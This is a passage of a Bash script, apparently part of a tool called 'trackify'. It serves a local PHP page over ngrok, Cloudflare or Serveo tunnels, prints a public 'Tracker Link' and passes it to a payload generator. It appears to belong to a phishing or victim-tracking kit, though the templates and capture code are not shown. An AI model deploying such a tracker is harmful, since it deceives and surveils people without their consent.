if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf "${Y}[!] Download error.${Reset}\n"
exit 1
fi
fi
fi
if [[ -e ~/.ngrok2/ngrok.yml ]]; then
printf "${Y}[${C}*${Y}] your ngrok "
cat  ~/.ngrok2/ngrok.yml
read -p $'\n'"${G}[${G}+${G}] Do you want to change your ngrok authtoken? [Y/n]: ${Reset}" chg_token
if [[ $chg_token == "Y" || $chg_token == "y" || $chg_token == "Yes" || $chg_token == "yes" ]]; then
read -p "${G}[${C}+${G}] Enter your valid ngrok authtoken: ${Reset}" ngrok_auth
./ngrok authtoken $ngrok_auth >  /dev/null 2>&1 &
printf "${G}[${C}*${G}] ${Y}Authtoken has been changed${Reset}\n"
fi
else
read -p "${G}[${C}+${G}] Enter your valid ngrok authtoken: ${Reset}" ngrok_auth
./ngrok authtoken $ngrok_auth >  /dev/null 2>&1 &
fi

checkphp=$(ps aux | grep -o "php" | head -n1)
if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi

printf "${G}[${G}+${G}] Starting php server...${Reset}\n"
fuser -k 3333/tcp > /dev/null 2>&1
php -S 127.0.0.1:3333 > /dev/null 2>&1 &
sleep 2
printf "${G}[${G}+${G}] Starting ngrok server...${Reset}\n"
./ngrok http 3333 > /dev/null 2>&1 &
sleep 10

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app')
if [[ -z "$link" ]]; then
printf "${Rb}[!] Tracker link is not generating. Check following:${Reset}\n"
printf "  ${G}[${C}*${G}] ${Y}Ngrok authtoken is not valid${Reset}\n"
printf "  ${G}[${C}*${G}] ${Y}If you are using android, turn hotspot on${Reset}\n"
printf "  ${G}[${C}*${G}] ${Y}Ngrok is already running? Run: killall ngrok${Reset}\n"
printf "  ${G}[${C}*${G}] ${Y}Check your internet connection${Reset}\n"
exit 1
else
printf "${G}[${C}*${G}] Tracker Link: ${W}%s${Reset}\n" $link
fi
payload_ngrok
checkfound
}

trackify() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }

select_notification
select_template
select_tunnel

# Check SSH requirement only for Serveo
if [[ $option_tunnel -eq 3 ]]; then
    command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
fi

start

}


payload() {

# Strip ANSI codes and extract URL - try multiple methods
send_link=$(cat sendlink 2>/dev/null | sed 's/\x1b\[[0-9;]*m//g' | grep -oE "https://[^[:space:]]*" | head -n1)
if [[ -z "$send_link" ]]; then
    # Alternative: extract any https URL pattern
    send_link=$(cat sendlink 2>/dev/null | tr -d '\r' | sed 's/\x1b\[[0-9;]*m//g' | grep -oE "https://[a-zA-Z0-9\-\.]+\.(serveo\.net|serveousercontent\.com)" | head -n1)
fi
if [[ -z "$send_link" ]]; then
    # Last resort: extract anything that looks like a URL
    send_link=$(cat sendlink 2>/dev/null | sed 's/.*https:\/\///' | sed 's/[[:space:]].*//' | head -n1)
    if [[ -n "$send_link" && "$send_link" != *"https://"* ]]; then
        send_link="https://$send_link"
    fi
fi

# Check if we successfully extracted a link
if [[ -z "$send_link" ]]; then
    printf "${Rb}[!] Error: Could not extract link for payload generation${Reset}\n"
    printf "${Y}[!] Please check the sendlink file or try again${Reset}\n"
    return 1
fi

generate_payload "$send_link"

}

start() {

if [[ $option_tunnel -eq 1 ]]; then
    # Ngrok
    ngrok_server
elif [[ $option_tunnel -eq 2 ]]; then
    # Cloudflare Tunnel
    cloudflared_server
    if [[ $? -eq 0 ]]; then
        checkfound
    else
        printf "${Rb}[!] Failed to start Cloudflare tunnel${Reset}\n"
        exit 1
    fi
elif [[ $option_tunnel -eq 3 ]]; then
    # Serveo
    server
    payload
    checkfound
else
    printf "${Rb}[!] Invalid tunnel option${Reset}\n"
    exit 1
fi

}

banner
dependencies
trackify
